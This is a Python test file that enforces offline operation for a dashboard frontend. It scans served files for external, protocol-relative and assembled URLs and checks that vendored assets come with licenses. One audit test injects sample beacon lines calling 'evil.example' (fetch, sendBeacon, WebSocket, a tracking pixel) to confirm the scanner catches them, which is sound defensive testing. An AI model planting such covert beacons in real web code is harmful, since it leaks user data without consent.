"""
The dashboard must work fully offline and never send anything to another host:
no CDN, no web fonts from Google, no album-art lookups. Every icon, font and
script it needs lives in code/frontend (third-party files in frontend/vendor/,
each with its license).

This scans every text file the frontend serves for http(s):// URLs and
protocol-relative ones (//host/...), and fails on any host that is not the local
server itself.
"""
import re
from pathlib import Path
from urllib.parse import urlsplit

FRONTEND = Path(__file__).resolve().parent.parent / "frontend"
TEXT_SUFFIXES = {".html", ".js", ".css", ".json", ".svg", ".webmanifest", ".map"}

# Hosts the frontend may load anything from. Only the local server: the app must
# work without internet. To allow another host (for example an explicit opt-in map
# tile server), add it here with a comment that says why, and make sure the
# frontend only contacts it after the user switched that option on.
ALLOWED_HOSTS = {
    "localhost",
    "127.0.0.1",
}

# The one URL the frontend may LOAD from the internet: the OpenStreetMap tile template of the
# Kaart view. It is only used after the user switched 'Gedetailleerde kaart (OpenStreetMap,
# online)' on in Instellingen or on the map (off by default; see map.js and the Playwright
# check in tests/ui/smoke_webkit.py that nothing leaves the machine while it is off).
ALLOWED_URLS = {
    "https://tile.openstreetmap.org/{z}/{x}/{y}.png",
}

# Identifiers that look like URLs but are never fetched (XML namespaces).
NAMESPACE_URLS = {
    "http://www.w3.org/2000/svg",
    # Leaflet's default attribution prefix (a link in the map corner, never fetched; map.js turns it off)
    "https://leafletjs.com",
}

# Hosts the user can open by clicking a link (a new browser tab). The app itself
# never requests them: no fetch, no <img>/<script>/<link>, no CSS url().
CLICK_ONLY_HOSTS = {
    "open.spotify.com",  # "zoek dit nummer op Spotify" in Spotify Wrapped
    "www.openstreetmap.org",  # the attribution link on the map while the OpenStreetMap tiles are on
}

URL_RE = re.compile(r"""\b(?:https?|wss?)://[^\s'"`)<>\\]+""", re.IGNORECASE)
# //host/... as an attribute or CSS value, or as ANY quoted string (fetch('//host/x'),
# sendBeacon(`//host`), new WebSocket("//host")): a quote, two slashes and a host name
PROTOCOL_RELATIVE_RE = re.compile(
    r"""(?:\b(?:src|href|action)\s*=\s*["']|url\(\s*["']?|@import\s+["']|["'`])//[A-Za-z0-9\[$]""",
    re.IGNORECASE)
# A URL glued together from parts, so that no whole URL appears in the source:
# `https:${'//'}${host}`, 'wss:' + '//' + host, a bare '//' string
CONSTRUCTED_URL_RE = re.compile(
    r"""\b(?:https?|wss?):(?:\$\{|["'`]\s*\+)|["'`]//["'`]|\b(?:https?|wss?)["'`]\s*\+\s*["'`]:""", re.IGNORECASE)
LOAD_CONTEXT_RE = re.compile(r"""fetch\(|\bsrc\s*=|url\(|@import|<link|<script|XMLHttpRequest""", re.IGNORECASE)
CSS_COMMENT_RE = re.compile(r"/\*.*?\*/", re.DOTALL)


def _frontend_text_files(root=None):
    for path in sorted((root or FRONTEND).rglob("*")):
        if path.is_file() and path.suffix.lower() in TEXT_SUFFIXES:
            yield path


def _code(path: Path) -> str:
    text = path.read_text(encoding="utf-8", errors="replace")
    vendored_js = path.suffix.lower() == ".js" and "vendor" in path.parts
    if path.suffix.lower() == ".css" or vendored_js:
        # License headers (/*! Font Awesome ... https://fontawesome.com */) are not requests
        text = CSS_COMMENT_RE.sub(lambda m: "\n" * m.group(0).count("\n"), text)
    return text


def _external_urls(root=None):
    root = root or FRONTEND
    for path in _frontend_text_files(root):
        for lineno, line in enumerate(_code(path).splitlines(), 1):
            for match in URL_RE.finditer(line):
                yield path.relative_to(root), lineno, line, match.group(0)


def _external_hosts_named(root=None):
    offending = []
    for rel, lineno, line, url in _external_urls(root):
        host = (urlsplit(url).hostname or "").lower()
        if host in ALLOWED_HOSTS or url in NAMESPACE_URLS or url in ALLOWED_URLS:
            continue
        if host in CLICK_ONLY_HOSTS and not LOAD_CONTEXT_RE.search(line):
            continue
        offending.append(f"{rel}:{lineno}: {url}")
    return offending


def _lines_matching(regex, root=None):
    root = root or FRONTEND
    offending = []
    for path in _frontend_text_files(root):
        for lineno, line in enumerate(_code(path).splitlines(), 1):
            if regex.search(line):
                offending.append(f"{path.relative_to(root)}:{lineno}: {line.strip()[:120]}")
    return offending


def test_frontend_has_files_to_scan():
    names = {p.name for p in _frontend_text_files()}
    assert {"index.html", "app.js", "style.css", "all.min.css"} <= names


def test_frontend_names_no_external_hosts():
    offending = _external_hosts_named()
    assert not offending, "external URLs in the frontend:\n" + "\n".join(offending)


def test_frontend_has_no_protocol_relative_urls():
    offending = _lines_matching(PROTOCOL_RELATIVE_RE)
    assert not offending, "\n".join(offending)


def test_frontend_builds_no_urls_from_parts():
    offending = _lines_matching(CONSTRUCTED_URL_RE)
    assert not offending, "\n".join(offending)


def test_the_scan_catches_hidden_external_requests(tmp_path):
    """PRIV-3: the ways around a plain https:// scan that the audit tried, in a copy of the frontend."""
    import shutil
    copy = tmp_path / "frontend"
    shutil.copytree(FRONTEND, copy, ignore=shutil.ignore_patterns("vendor"))
    tricks = {
        "fetch('//evil.example/beacon');": PROTOCOL_RELATIVE_RE,
        "navigator.sendBeacon(\"//evil.example/b\");": PROTOCOL_RELATIVE_RE,
        "img.src = `//${host}/pixel.gif`;": PROTOCOL_RELATIVE_RE,
        "new WebSocket('wss://evil.example/s');": None,
        "fetch(`https:${'//'}${host}/x`);": CONSTRUCTED_URL_RE,
        "fetch('https:' + '//' + host);": CONSTRUCTED_URL_RE,
    }
    for trick, regex in tricks.items():
        ui = copy / "ui.js"
        original = ui.read_text(encoding="utf-8")
        ui.write_text(original + "\n" + trick + "\n", encoding="utf-8")
        try:
            caught = _lines_matching(regex, copy) if regex is not None else _external_hosts_named(copy)
            assert any("ui.js" in line for line in caught), trick
        finally:
            ui.write_text(original, encoding="utf-8")


def test_vendored_assets_are_present_with_licenses():
    vendor = FRONTEND / "vendor"
    fa = vendor / "fontawesome-6.4.0"
    assert (fa / "LICENSE.txt").is_file()
    for name in ["fa-solid-900", "fa-regular-400", "fa-brands-400", "fa-v4compatibility"]:
        assert (fa / "webfonts" / f"{name}.woff2").is_file(), name
    # Every font the stylesheet points to is really there
    for css in [fa / "css" / "all.min.css", vendor / "jetbrains-mono" / "jetbrains-mono.css"]:
        refs = re.findall(r"url\(([^)]+)\)", _code(css))
        assert refs, css
        for ref in refs:
            target = (css.parent / ref.strip("'\"")).resolve()
            assert target.is_file(), f"{css.name} -> {ref}"
    assert (vendor / "jetbrains-mono" / "OFL.txt").is_file()


def test_index_loads_only_local_stylesheets_and_scripts():
    index = (FRONTEND / "index.html").read_text(encoding="utf-8")
    refs = re.findall(r"""<(?:link|script)\b[^>]*\b(?:href|src)\s*=\s*["']([^"']+)""", index)
    assert refs
    for ref in refs:
        assert "://" not in ref and not ref.startswith("//"), ref
        assert (FRONTEND / ref.split("?")[0]).is_file(), ref


def test_api_docs_pages_load_nothing_from_a_cdn(client):
    """FastAPI's /docs and /redoc pull Swagger UI and ReDoc from cdn.jsdelivr.net; they are off."""
    for url in ("/docs", "/redoc", "/docs/oauth2-redirect"):
        r = client.get(url)
        assert "cdn.jsdelivr.net" not in r.text
        assert "fastapi.tiangolo.com" not in r.text
        assert "swagger-ui" not in r.text.lower()
    # The machine-readable schema stays: plain JSON, nothing external
    r = client.get("/openapi.json")
    assert r.status_code == 200
    assert r.json()["info"]["title"] == "DataVault Dashboard"


def test_the_only_internet_url_is_the_opt_in_tile_template():
    """The tile URL appears in map.js only, and only the one template (no other tile server)."""
    using = {str(rel) for rel, _, _, url in _external_urls() if url in ALLOWED_URLS}
    assert using == {"map.js"}
    assert {urlsplit(u).hostname for u in ALLOWED_URLS} == {"tile.openstreetmap.org"}


def test_the_offline_basemap_and_map_libraries_are_vendored_with_licenses():
    vendor = FRONTEND / "vendor"
    assert (vendor / "leaflet-1.9.4" / "LICENSE").is_file() and (vendor / "leaflet-1.9.4" / "leaflet.js").is_file()
    assert (vendor / "leaflet.markercluster-1.5.3" / "LICENSE").is_file()
    assert (vendor / "naturalearth" / "countries-50m.geojson").is_file() and (vendor / "naturalearth" / "README.txt").is_file()
    for ref in re.findall(r"url\(([^)]+)\)", _code(vendor / "leaflet-1.9.4" / "leaflet.css")):
        if not ref.strip("'\"").startswith(("data:", "#")):
            assert (vendor / "leaflet-1.9.4" / ref.strip("'\"")).resolve().is_file(), ref
